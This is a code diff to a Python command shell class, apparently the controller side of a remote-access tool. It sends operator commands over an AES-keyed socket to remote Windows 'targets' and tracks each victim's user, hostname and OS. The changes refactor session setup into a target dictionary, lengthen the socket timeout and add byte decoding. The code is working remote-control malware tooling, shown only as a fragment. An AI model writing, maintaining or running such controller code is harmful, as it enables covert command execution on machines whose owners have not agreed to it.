@@ -2,21 +2,27 @@ from . import stitch_lib
 from .stitch_help import *
 from .stitch_utils import *
 
+
 class st_winshell(cmd.Cmd):
-    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
+    def begin_session(self,target, target_dict):
         cmd.Cmd.__init__(self)
         self.alive = True
         self.file_comp = []
         self.dir_comp = []
         self.all_comp = []
-        socket.settimeout(30)
         self.cli_temp = 'C:\\Windows\\Temp\\'
         self.ignore = ['cls','clear','EOF','exit']
+
         self.cli_dwld= os.path.join(downloads_path,target)
-        self.cli_os = stitch_lib.st_receive(socket, aes_key)
-        self.cli_user = stitch_lib.st_receive(socket, aes_key)
-        self.cli_hostname = stitch_lib.st_receive(socket, aes_key)
-        self.cli_platform = stitch_lib.st_receive(socket, aes_key)
+        port = target_dict['port']
+        socket = target_dict['sock']
+        socket.settimeout(600)
+        aes_key = target_dict['aes_key']
+        self.cli_os = target_dict['os']
+        self.cli_user = target_dict['user']
+        self.cli_hostname = target_dict['hostname']
+        self.cli_platform = target_dict['platform']
+
         self.stlib = stitch_lib.stitch_commands_library(socket, target, port, aes_key,
                                         self.cli_os,
                                         self.cli_platform,
@@ -29,7 +35,7 @@ class st_winshell(cmd.Cmd):
 
     def get_path(self,line='.'):
         self.do_pyexec('get_path.py',pylib=True)
-        paths = self.stlib.receive()
+        paths = self.stlib.receive().decode()
         if no_error(paths):
             self.dir_comp = []
             self.all_comp = []
@@ -41,12 +47,12 @@ class st_winshell(cmd.Cmd):
                 else:
                     self.file_comp.append(n)
                 self.all_comp.append(n)
-        self.prompt = self.stlib.receive()
+        self.prompt = self.stlib.receive().decode()
 
     def default(self, line):
         self.stlib.send(line)
         st_log.info('Sending command: "{}"'.format(line))
-        st_print(self.stlib.receive())
+        st_print(self.stlib.receive().decode())
 
     def precmd(self, line):
         if self.stlib.is_alive(line):
@@ -329,7 +335,7 @@ class st_winshell(cmd.Cmd):
 
     def help_EOF(self): st_help_EOF()
 
-def start_shell(t,p,c,a):
+def start_shell(target, target_dict):
     shell = st_winshell()
-    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
+    shell.begin_session(target, target_dict)
     shell.cmdloop()
